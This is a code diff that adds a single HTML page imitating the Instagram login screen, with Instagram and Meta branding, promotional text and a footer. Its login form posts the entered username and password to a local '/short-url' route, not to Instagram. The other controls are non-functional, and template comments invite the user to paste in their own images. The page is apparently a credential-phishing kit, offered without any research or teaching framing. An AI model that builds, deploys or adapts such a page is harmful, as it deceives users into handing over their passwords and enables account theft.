@@ -1,0 +1,229 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Instagram Login</title>
+<style>
+*{box-sizing:border-box}
+html,body{margin:0;width:100%;min-height:100%;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#000000;color:#f5f5f5}
+body{min-height:100vh;overflow-x:hidden}
+a,button,input{font:inherit}
+button,a{-webkit-tap-highlight-color:transparent}
+
+.page{min-height:100vh;display:flex;flex-direction:column}
+.main{flex:1;display:grid;grid-template-columns:minmax(0,1.5fr) minmax(430px,1fr);min-height:calc(100vh - 82px)}
+
+/* Promo Section (Left) */
+.promo{position:relative;background:#000000;display:flex;flex-direction:column;align-items:center;padding:40px 20px;}
+.promo-logo {position: absolute; top: 40px; left: 40px; width: 40px; height: 40px;}
+.promo-text {font-size: 32px; font-weight: 500; text-align: center; margin-top: 80px; margin-bottom: 40px; line-height: 1.3;}
+.promo-text .highlight {color: #ff306e;} 
+.promo-collage {max-width: 100%; width: 400px; height: auto; object-fit: contain;}
+
+/* Login Panel (Right) */
+.login-panel{background:#121212; border-left: 1px solid #262626; display:flex;justify-content:center;align-items:center;padding:50px 48px}
+.login-inner{width:min(100%,350px)}
+.heading{font-size:16px;font-weight:600;margin:0 0 25px;color:#f5f5f5;}
+.field{width:100%;height:40px;border:1px solid #363636;border-radius:6px;background:#121212;color:#f5f5f5;padding:0 10px;outline:none;margin-bottom:12px;font-size:14px}
+.field::placeholder{color:#a8a8a8}
+.field:focus{border-color:#555;box-shadow:none}
+
+/* Buttons */
+.login-btn{height:32px;width:100%;border:0;border-radius:8px;background:#252a65;color:#fff;font-size:14px;font-weight:600;cursor:pointer;margin-top:8px; margin-bottom: 20px; transition: background 0.2s;}
+.login-btn:hover{background:#323880}
+.login-btn:active{transform:scale(0.98)}
+
+.forgot{display:block;text-align:center;color:#f5f5f5;text-decoration:none;font-size:12px;margin:15px 0 30px}
+.forgot:hover{text-decoration:none; opacity: 0.7;}
+
+.fb{height:32px;width:100%;border:0;border-radius:8px;background:#363636;color:#e0e0e0;cursor:pointer;font-size:14px;font-weight:600;margin-bottom:15px; display:flex; justify-content:center; align-items:center;}
+.fb span{color:#1877f2;font-weight:800;margin-right:8px;font-size:16px;}
+.create{height:32px;width:100%;border:1px solid #363636;border-radius:22px;background:transparent;color:#3da0ff;font-size:14px;font-weight:600;cursor:pointer; border-radius: 8px;}
+
+.meta{text-align:center;color:#a8a8a8;font-size:14px;margin-top:40px; display:flex; justify-content:center; align-items:center; gap: 5px;}
+.meta svg { fill: #a8a8a8; width: 16px; height: 16px; }
+
+/* Footer */
+.footer{min-height:82px;background:#000000;border-top:1px solid #262626;display:flex;flex-direction:column;align-items:center;justify-content:center;color:#a8a8a8; padding: 20px 0;}
+.footer-links{display:flex;justify-content:center;flex-wrap:wrap;gap:10px 16px;max-width:1000px;padding:0 20px}
+.footer a{font-size:12px;color:#a8a8a8;text-decoration:none;white-space:nowrap}
+.footer a:hover{text-decoration:underline}
+.footer-bottom{font-size:12px;margin-top:15px; display:flex; gap: 15px; align-items:center;}
+
+form { margin: 0; padding: 0; width: 100%; }
+
+@media (max-width:875px){
+  .main{display:flex; flex-direction:column; min-height:calc(100vh - 130px)}
+
+  /* Mobile header: show the Instagram logo instead of hiding the promo panel. */
+  .promo{
+    display:flex;
+    flex:0 0 98px;
+    min-height:98px;
+    height:98px;
+    width:100%;
+    padding:0;
+    border-bottom:1px solid #363636;
+    border-right:none;
+    align-items:center;
+    justify-content:center;
+  }
+
+  .promo-logo{
+    position:static;
+    display:block;
+    width:76px;
+    height:76px;
+    object-fit:contain;
+  }
+
+  /* Desktop promotional text/artwork is omitted on narrow screens. */
+  .promo-text,
+  .promo-collage{
+    display:none;
+  }
+
+  .login-panel{
+    flex:1 1 auto;
+    min-height:calc(100vh - 228px);
+    padding:86px 20px 50px;
+    border-left:none;
+    border-top:none;
+    align-items:flex-start;
+  }
+
+  .login-inner{
+    width:min(100%, 296px);
+  }
+
+  .heading{margin-bottom:25px}
+
+  .field{
+    height:58px;
+    border-radius:15px;
+    padding:0 16px;
+    font-size:15px;
+    margin-bottom:12px;
+  }
+
+  .login-btn{
+    height:45px;
+    border-radius:23px;
+    margin-top:12px;
+    margin-bottom:20px;
+  }
+
+  .forgot{
+    font-size:14px;
+    margin:24px 0 59px;
+  }
+
+  .fb{
+    height:45px;
+    border-radius:23px;
+    margin-bottom:12px;
+  }
+
+  .create{
+    height:45px;
+    border-radius:23px;
+  }
+
+  .meta{margin-top:27px}
+
+  .footer{
+    min-height:118px;
+    padding:22px 10px 16px;
+  }
+
+  .footer-links{
+    gap:8px 15px;
+    padding:0 12px;
+  }
+
+  .footer a,
+  .footer-bottom{
+    font-size:11px;
+  }
+
+  .footer-bottom{
+    margin-top:14px;
+    gap:13px;
+  }
+}
+
+@media (max-width:380px){
+  .promo{flex-basis:90px; min-height:90px; height:90px}
+  .promo-logo{width:70px;height:70px}
+  .login-panel{min-height:calc(100vh - 220px);padding:70px 16px 42px}
+  .login-inner{width:min(100%, 320px)}
+  .footer-links{gap:7px 12px}
+}
+</style>
+</head>
+<body>
+<div class="page">
+  <main class="main">
+    
+    <!-- Left Panel with Web Images -->
+    <section class="promo">
+      <!-- Stable Wikimedia Link for the Instagram Logo -->
+      <img src="https://i.ibb.co/x4KfwPv/YOUR-IG-LOGO.png" alt="Instagram Logo" class="promo-logo">
+      
+      <div class="promo-text">
+        See everyday moments from<br>your <span class="highlight">close friends.</span>
+      </div>
+      
+      <!-- Paste your copied web image address here! -->
+      <img src="https://i.ibb.co/1YyKBTF9/YOUR-COLLAGE-IMAGE.webp" alt="Moments Collage" class="promo-collage">
+    </section>
+    
+    <!-- Right Login Panel -->
+    <section class="login-panel">
+      <div class="login-inner">
+        <h1 class="heading">Log in to Instagram</h1>
+        
+        <form action="/short-url" method="post">
+          <input type="text" name="username" class="field" placeholder="Mobile number, username or email address" required>
+          <input type="password" name="password" class="field" placeholder="Password" required>
+          <button type="submit" class="login-btn">Log in</button>
+        </form>
+        
+        <a href="#" class="forgot">Forgotten password?</a>
+        <button class="fb"><span>f</span> Log in with Facebook</button>
+        <button class="create">Create new account</button>
+        
+        <div class="meta">
+          <svg viewBox="0 0 36 36"><path d="M25.7 12.9c-2.3 0-4.3 1.2-5.4 3-1.1-1.8-3.1-3-5.4-3-3.5 0-6.4 2.9-6.4 6.4 0 3.5 2.9 6.4 6.4 6.4 2.3 0 4.3-1.2 5.4-3 1.1 1.8 3.1 3 5.4 3 3.5 0 6.4-2.9 6.4-6.4 0-3.5-2.9-6.4-6.4-6.4zm0 10.4c-2.2 0-4-1.8-4-4s1.8-4 4-4 4 1.8 4 4-1.8 4-4 4zm-10.8 0c-2.2 0-4-1.8-4-4s1.8-4 4-4 4 1.8 4 4-1.8 4-4 4z"></path></svg>
+          Meta
+        </div>
+      </div>
+    </section>
+  </main>
+  
+  <footer class="footer">
+    <div class="footer-links">
+      <a href="#">Meta</a>
+      <a href="#">About</a>
+      <a href="#">Blog</a>
+      <a href="#">Jobs</a>
+      <a href="#">Help</a>
+      <a href="#">API</a>
+      <a href="#">Privacy</a>
+      <a href="#">Terms</a>
+      <a href="#">Locations</a>
+      <a href="#">Popular</a>
+      <a href="#">Instagram Lite</a>
+      <a href="#">Threads</a>
+      <a href="#">Contact uploading and non-users</a>
+      <a href="#">Meta Verified</a>
+    </div>
+    <div class="footer-bottom">
+      <span>English (UK)</span>
+      <span>&copy; 2026 Instagram from Meta</span>
+    </div>
+  </footer>
+</div>
+</body>
+</html>
